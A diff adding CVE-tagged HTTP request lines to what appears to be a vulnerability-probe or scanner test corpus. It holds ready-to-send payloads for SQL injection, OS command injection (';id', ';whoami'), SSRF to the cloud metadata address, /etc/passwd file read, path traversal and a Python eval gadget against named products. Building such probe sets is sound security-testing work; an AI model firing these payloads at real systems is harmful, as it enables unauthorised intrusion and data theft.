@@ -1236,6 +1236,46 @@ GET /api/v1/auth/auto-login/users
 GET /users?email=x%27%27%20OR%201%3D1--
 POST /users/login header="Content-Type: application/x-www-form-urlencoded" body="email=admin%27%27%20OR%20%271%27%3D%271&password=x"
 
+# --- CVE-2026-111472 (TSG Profleet), CVE-2026-111685 / CVE-2026-111686
+#     (IceCMS), CVE-2026-111700 (WebVella ERP), CVE-2026-111634 (Helical
+#     Insight), CVE-2026-111718 (AipexBase), CVE-2026-53574 (EspoCRM) and
+#     CVE-2026-63314 (Slican WebCTI): SQL injection reaching the query layer
+#     through a parameter, ORDER BY clause, or the EQL/report query APIs. ---
+GET /cgi-bin/index.php?Identificaci%C3%B3n=1%27%20OR%20%271%27%3D%271
+GET /WebResource/findresourcebynum?num=1%20UNION%20SELECT%20username,password%20FROM%20user
+GET /WebArticle/findarticlesbynum?num=1%20UNION%20SELECT%20password%20FROM%20user
+GET /webcti/admin_json.php?user=1%27%20OR%20%271%27%3D%271
+GET /api/v1/Contact/streamAttachments?where%5B0%5D%5Btype%5D=equals&where%5B0%5D%5Bfield%5D=name&where%5B0%5D%5Bvalue%5D=1%27%20OR%20%271%27%3D%271
+GET /dzz/pichome/library/filelist.php?asc=1,(select(sleep(5)))
+POST /api/data/invoke header="Content-Type: application/json" body="{\"order_by\":\"1 UNION SELECT password FROM users\"}"
+POST /api/v3/en_US/eql header="Content-Type: application/json" body="{\"query\":\"name = 'x' OR '1'='1'\"}"
+POST /executeDatasource header="Content-Type: application/x-www-form-urlencoded" body="placeholder=1' OR '1'='1"
+
+# --- CVE-2026-102607 / CVE-2026-102608 / CVE-2026-30971 (ZoneMinder),
+#     CVE-2026-110908 (pfSense FRR), CVE-2026-92263 (SparkyFitness) and
+#     CVE-2026-110447 (Collabora richdocumentscode): OS command injection
+#     through a request parameter, monitor field, or uploaded filename. ---
+GET /zm/index.php?view=events&action=export&exportFile=%3Bid
+POST /zm/index.php header="Content-Type: application/x-www-form-urlencoded" body="view=monitor&action=save&monitor[Name]=;whoami"
+POST /zm/index.php header="Content-Type: application/x-www-form-urlencoded" body="view=monitor&action=save&monitor[Device]=;id"
+GET /status_frr.php?filter=%3Bid
+POST /api/admin/backup/restore header="Content-Type: application/x-www-form-urlencoded" body="filename=backup.zip;id"
+GET /apps/richdocumentscode/proxy.php?req=%3Bid%3B
+
+# --- CVE-2026-101300 (Wegow), CVE-2026-111234 (SimplePie): server-side
+#     request forgery and local file read through a request parameter. ---
+POST /api/ticket-sales/export header="Content-Type: application/json" body="{\"svg\":\"<svg><image href=http://169.254.169.254/latest/meta-data/></svg>\"}"
+GET /feed.php?url=file:///etc/passwd
+
+# --- CVE-2026-84823 (WildFly take-snapshot): path traversal writing the server
+#     configuration snapshot outside the intended directory. ---
+POST /management header="Content-Type: application/json" body="{\"operation\":\"take-snapshot\",\"address\":[],\"name\":\"../../../../../../tmp/evil.xml\"}"
+
+# --- CVE-2026-111391 (SGLang debug dumper): the unauthenticated
+#     /dumper/configure endpoint evals a caller-supplied filter and a
+#     re.search gadget reaches __globals__ to run Python code. ---
+POST /dumper/configure header="Content-Type: application/json" body="{\"filter\":\"search.__globals__['__builtins__']['__import__']('os').system('id')\"}"
+
 # Classes that still need connection-level framing, a malicious upstream, or
 # configuration-specific state; no request line can express them.
 # CVE-2026-42533 (nginx): the HTTP variant needs a regex map and regex location
